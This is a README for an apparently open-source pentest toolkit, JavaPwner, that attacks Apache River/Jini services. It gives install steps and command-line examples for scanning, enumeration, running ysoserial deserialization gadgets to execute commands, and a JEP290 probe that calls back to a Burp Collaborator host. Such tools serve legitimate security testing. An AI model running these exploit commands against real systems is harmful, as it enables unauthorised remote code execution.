# JavaPwner

Python pentest toolkit targeting Java middleware protocols. Starts with Apache River / Jini (port 4160).

## Requirements

- Python 3.10+
- Java JRE (for payload generation)
- [ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases) → place as `lib/ysoserial.jar`

## Install

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e .
```

## Usage

```bash
# Scan
javapwner jini scan -t 192.168.1.10

# Enumerate services (heuristic)
javapwner jini enum -t 192.168.1.10 --verbose

# List available gadgets
javapwner jini gadgets

# Exploit
javapwner jini exploit -t 192.168.1.10 --gadget CommonsCollections6 --cmd 'id'

# Probe for JEP290 filters (URLDNS)
javapwner jini exploit -t 192.168.1.10 --gadget URLDNS --cmd http://cb.burpcollaborator.net \
  --jep290-probe --dns-url http://cb.burpcollaborator.net
```

Global flags: `--verbose`, `--json`, `--timeout`, `--ysoserial <path>`

## Tests

```bash
pip install -e ".[dev]"
pytest tests/
```

Live integration tests (require a running Reggie):
```bash
JINI_TARGET_HOST=192.168.1.10 pytest tests/integration/ -m live
```
